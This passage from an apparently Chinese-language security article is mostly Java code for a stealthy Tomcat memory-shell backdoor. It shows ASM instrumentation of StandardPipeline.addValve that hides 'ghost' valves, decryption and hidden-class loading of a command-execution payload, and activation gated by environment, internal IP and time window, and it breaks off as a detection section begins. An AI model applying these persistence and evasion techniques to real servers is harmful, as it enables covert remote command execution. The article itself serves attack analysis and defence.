</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
</span><span class="lnt" id="32"><a class="lnlinks" href="#32">32</a>
</span><span class="lnt" id="33"><a class="lnlinks" href="#33">33</a>
</span><span class="lnt" id="34"><a class="lnlinks" href="#34">34</a>
</span><span class="lnt" id="35"><a class="lnlinks" href="#35">35</a>
</span><span class="lnt" id="36"><a class="lnlinks" href="#36">36</a>
</span><span class="lnt" id="37"><a class="lnlinks" href="#37">37</a>
</span><span class="lnt" id="38"><a class="lnlinks" href="#38">38</a>
</span><span class="lnt" id="39"><a class="lnlinks" href="#39">39</a>
</span><span class="lnt" id="40"><a class="lnlinks" href="#40">40</a>
</span><span class="lnt" id="41"><a class="lnlinks" href="#41">41</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 修改StandardPipeline的addValve方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">MethodVisitor</span><span class="w"> </span><span class="nf">visitMethod</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">access</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">desc</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="n">String</span><span class="w"> </span><span class="n">signature</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">exceptions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&#34;addValve&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;(Lorg/apache/catalina/Valve;)V&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">desc</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MethodVisitor</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">ASM9</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">.</span><span class="na">visitMethod</span><span class="p">(</span><span class="n">access</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">desc</span><span class="p">,</span><span class="w"> </span><span class="n">signature</span><span class="p">,</span><span class="w"> </span><span class="n">exceptions</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">visitCode</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">// 在添加Valve前进行检查</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitVarInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">ALOAD</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// 加载Valve参数</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitMethodInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">INVOKESTATIC</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="s">&#34;com/evil/EmbeddedLogic&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="s">&#34;isGhostValve&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="s">&#34;(Lorg/apache/catalina/Valve;)Z&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Label</span><span class="w"> </span><span class="n">normalPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Label</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitJumpInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">IFEQ</span><span class="p">,</span><span class="w"> </span><span class="n">normalPath</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">// 幽灵Valve：不加入主数组，加入隐藏列表</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitVarInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">ALOAD</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// this</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitVarInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">ALOAD</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// Valve</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitMethodInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">INVOKESTATIC</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="s">&#34;com/evil/EmbeddedLogic&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="s">&#34;addToGhostList&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="s">&#34;(Lorg/apache/catalina/core/StandardPipeline;Lorg/apache/catalina/Valve;)V&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                  </span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">RETURN</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mv</span><span class="p">.</span><span class="na">visitLabel</span><span class="p">(</span><span class="n">normalPath</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kd">super</span><span class="p">.</span><span class="na">visitCode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">visitMethod</span><span class="p">(</span><span class="n">access</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">desc</span><span class="p">,</span><span class="w"> </span><span class="n">signature</span><span class="p">,</span><span class="w"> </span><span class="n">exceptions</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>2. 动态代码解密</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EmbeddedLogic</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 加密的命令执行逻辑</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ENCRYPTED_LOGIC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">0x12</span><span class="p">,</span><span class="w"> </span><span class="n">0x45</span><span class="p">,</span><span class="w"> </span><span class="n">0x78</span><span class="p">,</span><span class="w"> </span><span class="p">...};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">executeCommand</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 动态解密并执行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decrypt</span><span class="p">(</span><span class="n">ENCRYPTED_LOGIC</span><span class="p">,</span><span class="w"> </span><span class="n">getRuntimeKey</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">MethodHandle</span><span class="w"> </span><span class="n">mh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MethodHandles</span><span class="p">.</span><span class="na">lookup</span><span class="p">().</span><span class="na">defineHiddenClass</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">decrypted</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="n">MethodHandles</span><span class="p">.</span><span class="na">Lookup</span><span class="p">.</span><span class="na">ClassOption</span><span class="p">.</span><span class="na">NESTMATE</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">.</span><span class="na">findStatic</span><span class="p">(</span><span class="s">&#34;Stealth&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;run&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">MethodType</span><span class="p">.</span><span class="na">methodType</span><span class="p">(</span><span class="kt">void</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="p">.</span><span class="na">class</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">mh</span><span class="p">.</span><span class="na">invokeExact</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 错误处理</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 基于环境动态生成密钥</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">getRuntimeKey</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;user.name&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="n">System</span><span class="p">.</span><span class="na">getenv</span><span class="p">(</span><span class="s">&#34;CATALINA_HOME&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">MessageDigest</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;SHA-256&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="na">digest</span><span class="p">(</span><span class="n">seed</span><span class="p">.</span><span class="na">getBytes</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>3. 环境感知伪装</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkRequest</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 仅在生产环境激活</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="s">&#34;production&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;app.env&#34;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 检查请求来源IP（仅允许内网）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">remoteAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getRemoteAddr</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">remoteAddr</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;192.168.&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">!</span><span class="n">remoteAddr</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;10.&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 检查请求时间（仅UTC 02:00-04:00激活）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ZonedDateTime</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ZonedDateTime</span><span class="p">.</span><span class="na">now</span><span class="p">(</span><span class="n">ZoneId</span><span class="p">.</span><span class="na">of</span><span class="p">(</span><span class="s">&#34;UTC&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">now</span><span class="p">.</span><span class="na">getHour</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">2</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">now</span><span class="p">.</span><span class="na">getHour</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 真正的触发逻辑...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="四检测防御策略">四、检测防御策略<a hidden class="anchor" aria-hidden="true" href="#四检测防御策略">#</a></h3>
<p><strong>1. 类完整性验证</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ClassIntegrityVerifier</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">KNOWN_DIGESTS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">of</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;org.apache.catalina.core.StandardPipeline&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;a1b2c3d4...&#34;</span><span class="p">,</span><span class="w">
